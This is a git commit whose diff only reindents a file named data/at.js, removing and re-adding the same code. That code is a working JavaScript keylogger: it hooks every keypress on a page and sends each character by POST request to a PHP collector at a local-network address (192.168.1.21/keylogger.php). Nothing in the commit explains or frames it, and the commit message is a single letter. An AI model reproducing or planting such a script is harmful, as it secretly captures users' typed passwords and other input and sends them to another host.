1a13868b13baba6be891553233fd50b62fc5bc42
HelmitEvo <helmit2013@gmail.com>
2015-10-30 23:47:18 -0300

    z

--- data/at.js
+++ data/at.js
@@ -1,11 +1,10 @@
-
-	document.onkeypress=function(evt){
-		var evt=evt||window.event;
-		var key=String.fromCharCode(evt.charCode);
-		if(key){
-			var http=new XMLHttpRequest();
-			var param=encodeURI(key);http.open("POST","http://192.168.1.21/keylogger.php",true);
-			http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-			http.send("key="+param);
-		}
+document.onkeypress=function(evt){
+	var evt=evt||window.event;
+	var key=String.fromCharCode(evt.charCode);
+	if(key){
+		var http=new XMLHttpRequest();
+		var param=encodeURI(key);http.open("POST","http://192.168.1.21/keylogger.php",true);
+		http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+		http.send("key="+param);
 	}
+}
